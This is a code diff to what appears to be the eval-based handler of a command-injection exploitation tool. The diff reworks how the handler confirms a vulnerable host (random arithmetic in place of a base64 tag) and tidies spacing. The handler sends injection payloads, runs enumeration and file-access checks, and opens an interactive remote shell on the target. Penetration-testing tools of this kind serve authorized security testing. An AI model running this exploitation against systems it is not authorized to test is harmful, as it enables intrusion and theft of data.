@@ -42,7 +42,7 @@ from src.core.injections.results_based.techniques.eval_based import eb_file_acce
 #-------------------------------------------------
 # The "eval-based" injection technique handler.
 #-------------------------------------------------
-def eb_injection_handler(url,delay,filename,http_request_method):
+def eb_injection_handler(url, delay, filename, http_request_method):
   
   counter = 0
   vp_flag = True
@@ -67,20 +67,17 @@ def eb_injection_handler(url,delay,filename,http_request_method):
         combination = prefix + separator
         if combination in settings.JUNK_COMBINATION:
           prefix = ""
-                
-        # Change TAG on every request to prevent false-positive results.
-        TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))  
-        B64_ENC_TAG = base64.b64encode(TAG)
-        B64_DEC_TRICK = settings.B64_DEC_TRICK
 
-        # Check if defined "--base64" option.
-        if menu.options.base64_trick == False:
-          B64_ENC_TAG = TAG
-          B64_DEC_TRICK = ""
-          
+        # Change TAG on every request to prevent false-positive results.
+        TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
+
+        randv1 = random.randrange(100)
+        randv2 = random.randrange(100)
+        randvcalc = randv1 + randv2
+
         try:
           # Eval-based decision payload (check if host is vulnerable).
-          payload = eb_payloads.decision(separator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
+          payload = eb_payloads.decision(separator, TAG, randv1, randv2)
 
           # Check if defined "--prefix" option.
           if menu.options.prefix:
@@ -96,7 +93,7 @@ def eb_injection_handler(url,delay,filename,http_request_method):
           else:
             payload = payload + suffix
       
-          payload = payload + "" + B64_DEC_TRICK + ""
+          payload = payload + "" + TAG + ""
           payload = re.sub(" ", "%20", payload)
 
           # Check if defined "--verbose" option.
@@ -104,7 +101,7 @@ def eb_injection_handler(url,delay,filename,http_request_method):
             sys.stdout.write("\n" + Fore.GREY + payload + Style.RESET_ALL)
 
           # Check if target host is vulnerable.
-          response,vuln_parameter = eb_injector.injection_test(payload,http_request_method,url)          
+          response, vuln_parameter = eb_injector.injection_test(payload, http_request_method, url)          
   
           # if need page reload
           if menu.options.url_reload: 
@@ -112,7 +109,7 @@ def eb_injection_handler(url,delay,filename,http_request_method):
             response = urllib.urlopen(url)
             
           # Evaluate test results.
-          shell = eb_injector.injection_test_results(response,TAG)
+          shell = eb_injector.injection_test_results(response, TAG, randvcalc)
           if not menu.options.verbose:
             percent = ((i*100)/total)
             if percent == 100:
@@ -193,10 +190,10 @@ def eb_injection_handler(url,delay,filename,http_request_method):
             print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload) + Style.RESET_ALL
             
           # Check for any enumeration options.
-          eb_enumeration.do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
+          eb_enumeration.do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)
 
           # Check for any system file access options.
-          eb_file_access.do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
+          eb_file_access.do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)
           
           # Pseudo-Terminal shell
           while True:
@@ -207,12 +204,12 @@ def eb_injection_handler(url,delay,filename,http_request_method):
               while True:
                 try:
                   cmd = raw_input("Shell > ")
-                  cmd = re.sub(" ","%20", cmd)
+                  cmd = re.sub(" ", "%20", cmd)
                   if cmd == "q":
                     sys.exit(0)
                   else:
                     # The main command injection exploitation.
-                    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url,vuln_parameter)
+                    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
                           
                     # if need page reload
                     if menu.options.url_reload:
@@ -220,7 +217,7 @@ def eb_injection_handler(url,delay,filename,http_request_method):
                       response = urllib.urlopen(url)
                       
                     # Command execution results.
-                    shell = eb_injector.injection_results(response,TAG)
+                    shell = eb_injector.injection_results(response, TAG)
                     if shell:
                       shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
                       print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n"
@@ -250,8 +247,8 @@ def eb_injection_handler(url,delay,filename,http_request_method):
     sys.stdout.flush()
     return True
 
-def exploitation(url,delay,filename,http_request_method):
-    if eb_injection_handler(url,delay,filename,http_request_method) == False:
+def exploitation(url, delay, filename, http_request_method):
+    if eb_injection_handler(url, delay, filename, http_request_method) == False:
       return False
 
 #eof
